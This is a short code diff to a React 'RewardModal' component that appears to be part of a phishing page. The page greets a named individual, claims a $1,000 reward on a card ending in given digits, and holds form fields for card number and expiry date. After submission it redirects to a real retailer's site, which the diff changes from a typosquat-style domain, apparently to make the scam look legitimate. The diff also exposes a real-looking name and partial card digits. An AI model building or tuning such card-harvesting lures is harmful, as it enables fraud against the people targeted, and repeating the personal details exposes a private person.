@@ -125,7 +125,7 @@ export default function RewardModal() {
       setIsVisible(false)
       setTimeout(() => {
         setIsOpen(false)
-        window.location.href = "https://www.googgle.com"
+        window.location.href = "https://www.homedepot.com"
         setStep(1)
         setFormData({ cardNumber: "", hobby: "", expiryDate: "" })
         setErrors({ cardNumber: "", hobby: "", expiryDate: "" })
@@ -244,7 +244,7 @@ export default function RewardModal() {
           <div className="animate-in fade-in zoom-in-95 duration-500">
             <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
               <h2 className="text-2xl font-bold">Hello ANNETTE T PERRY</h2>
-              <p className="text-lg mt-1">You have been rewarded $1,000 on card ending with <b>xxx9597</b></p>
+              <p className="text-lg mt-1">You have been rewarded $1,000 on card ending with <b>xxx4654</b></p>
             </div>
 
             <div className="p-4 flex justify-center">
